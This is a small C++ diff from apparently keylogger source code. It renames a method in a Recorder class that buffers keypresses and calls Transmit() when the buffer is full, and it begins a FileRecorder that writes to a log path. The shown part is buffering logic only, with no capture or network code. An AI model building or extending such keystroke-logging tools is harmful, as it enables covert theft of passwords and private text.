@@ -5,18 +5,18 @@
 
 namespace keylogger {
 
-Recorder::Recorder(int key_limit) : num_keys_(0), keys_(key_limit, '\0') {
+Recorder::Recorder(int key_limit) : num_keys_(0), keys_(key_limit) {
   if (key_limit <= 0) {
     throw std::invalid_argument("key_limit must be a positive integer");
   }
 }
 
-void Recorder::BufferKeypress(char key) {
+void Recorder::BufferKeyPress(char character) {
   if (num_keys_ >= static_cast<int>(keys_.capacity())) {
     /* no room remaining to log this key, flush the buffer */
     Transmit();
   }
-  keys_[num_keys_++] = key;
+  keys_[num_keys_++] = character;
 }
 
 FileRecorder::FileRecorder(int key_limit, const std::filesystem::path& log_path)
